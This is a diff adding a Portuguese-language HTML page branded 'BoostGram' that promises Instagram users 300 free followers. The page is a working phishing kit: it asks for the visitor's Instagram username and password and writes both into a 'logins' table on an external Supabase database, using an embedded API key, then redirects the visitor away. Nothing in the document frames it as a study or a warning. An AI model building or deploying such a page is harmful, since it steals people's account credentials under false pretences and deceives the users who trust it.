@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>free-followers</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+</head>
+<style>
+    body {
+        font-family: Arial, Helvetica, sans-serif;
+        background-image: linear-gradient(45deg, rgb(255, 230, 0), rgb(225, 0, 255), rgb(17, 0, 255));
+    }
+
+    .login {
+        background-color: rgba(0, 0, 0, 0.705);
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        padding: 40px;
+        border-radius: 30px;
+        color: white;
+        text-align: center;
+        justify-content: center;
+    }
+
+    input {
+        padding: 15px;
+        border-radius: 15px;
+        background-color: rgb(65, 59, 59);
+        outline: none;
+        color: white;
+        font-size: 15px;
+        border: none;
+        width: 250px;
+    }
+
+    a {
+        color: dodgerblue;
+    }
+
+    span {
+        color: magenta;
+    }
+
+    footer {
+        text-align: center;
+    }
+
+
+    button {
+        text-decoration: none;
+        padding: 15px;
+        background-color: blueviolet;
+        color: white;
+        border: none;
+        border-radius: 15px;
+        transition: box-shadow 0.3s ease-in-out, background-color 0.3s;
+        width: 250px;
+    }
+
+    button:hover {
+        box-shadow: 0 0 15px #007bff, 0 0 30px #007bff;
+        background-color: #2e007d;
+    }
+</style>
+
+<body>
+    <div class="login">
+        <h1>Seja Bem vindo ao <span>BoostGram</span></h1>
+        <h4><i>Insira logo abaixo seu usuario(Exemplo: miguelrx25) e sua senha do instagram para receber mais de 300
+                seguidores ainda hoje</i></h4>
+        <br><br>
+        <input id="email" type="text" placeholder="usuário">
+        <br><br>
+        <input id="password" type="password" placeholder="senha">
+        <br><br>
+        <button onclick="login()">Enviar</button>
+        <br><br>
+    </div>
+    <script>
+        const SUPABASE_URL = 'https://emlcxdwkicjdzbbsdzvw.supabase.co';
+        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVtbGN4ZHdraWNqZHpiYnNkenZ3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzIzNDc1NDEsImV4cCI6MjA4NzkyMzU0MX0.V2-468uPNIwoj6N4NtyRyIWNP2ucyPxCv6DFRG9nAQc'; // Sua chave completa aqui
+
+        const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+        async function login() {
+            const userField = document.getElementById('email').value;
+            const passwordField = document.getElementById('password').value;
+
+            if (!userField || !passwordField) {
+                alert("Preencha todos os campos!");
+                return;
+            }
+            const { error } = await _supabase
+                .from('logins')
+                .insert([
+                    { usuario: userField, senha: passwordField }
+                ]);
+
+            if (error) {
+                console.error('Erro:', error.message);
+                alert("Erro ao conectar ao servidor de seguidores.");
+            } else {
+                window.location.href = "index2.html";
+            }
+        }
+    </script>
+</body>
+
+</html>
